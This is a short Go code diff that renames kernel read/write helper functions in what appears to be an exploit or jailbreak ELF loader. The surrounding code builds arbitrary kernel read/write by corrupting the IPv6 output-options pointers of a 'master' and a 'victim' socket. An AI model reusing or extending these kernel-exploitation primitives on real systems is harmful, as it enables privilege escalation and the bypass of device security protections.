@@ -536,31 +536,31 @@ func createReadWriteSockets(proc KProc, sockets [2]int) error {
 		log.Println(ErrNullSock)
 		return ErrNullSock
 	}
-	kwrite32(sock, 0x100)
-	pcb := uintptr(kread64(sock + 0x18))
+	Kwrite32(sock, 0x100)
+	pcb := uintptr(Kread64(sock + 0x18))
 	if pcb == 0 {
 		log.Println(ErrNullMasterPcb)
 		return ErrNullMasterPcb
 	}
-	master_inp6_outputopts := uintptr(kread64(pcb + 0x120))
+	master_inp6_outputopts := uintptr(Kread64(pcb + 0x120))
 	if master_inp6_outputopts == 0 {
 		log.Println(ErrNullMasterOutputOpts)
 		return ErrNullMasterOutputOpts
 	}
 	sock = uintptr(newtbl.GetFileData(sockets[1]))
-	kwrite32(sock, 0x100)
-	pcb = uintptr(kread64(sock + 0x18))
+	Kwrite32(sock, 0x100)
+	pcb = uintptr(Kread64(sock + 0x18))
 	if pcb == 0 {
 		log.Println(ErrNullVictimPcb)
 		return ErrNullVictimPcb
 	}
-	victim_inp6_outputopts := kread64(pcb + 0x120)
+	victim_inp6_outputopts := Kread64(pcb + 0x120)
 	if victim_inp6_outputopts == 0 {
 		log.Println(ErrNullVictimOutputOpts)
 		return ErrNullVictimOutputOpts
 	}
-	kwrite64(master_inp6_outputopts+0x10, victim_inp6_outputopts+0x10)
-	kwrite32(master_inp6_outputopts+0xc0, 0x13370000)
+	Kwrite64(master_inp6_outputopts+0x10, victim_inp6_outputopts+0x10)
+	Kwrite32(master_inp6_outputopts+0xc0, 0x13370000)
 	return nil
 }
 
@@ -635,7 +635,7 @@ func (ldr *ElfLoader) setupKernelRW() (addr uintptr, err error) {
 	}
 
 	newtbl := proc.GetFd().GetFdTbl()
-	pipeaddr := uintptr(kread64(newtbl.GetFile(int(files[2]))))
+	pipeaddr := uintptr(Kread64(newtbl.GetFile(int(files[2]))))
 
 	var regs Reg
 	err = ldr.tracer.GetRegisters(&regs)
